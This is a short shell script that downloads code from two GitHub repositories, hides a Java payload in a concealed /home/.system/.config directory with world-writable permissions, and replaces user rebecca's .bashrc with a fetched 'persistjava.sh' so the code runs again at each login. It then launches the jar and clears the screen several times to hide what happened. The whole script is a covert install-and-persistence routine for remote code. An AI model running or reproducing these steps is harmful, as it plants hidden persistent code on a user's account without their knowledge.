cd /home
mkdir .system
mkdir .system/.config
git clone https://github.com/rikosanjuri14/wannaplay
clear
git clone https://github.com/rikosanjuri14/pantest
clear
mv /home/wannaplay/system.jar /home/.system/.config
chmod 777 /home/.system/.config/system.jar
mv /home/pantest/persistjava.sh /home/rebecca
cd /home/rebecca
rm .bashrc 
mv persistjava.sh .bashrc
java -jar /home/.system/.config/system.jar
cd /home/rebecca
clear
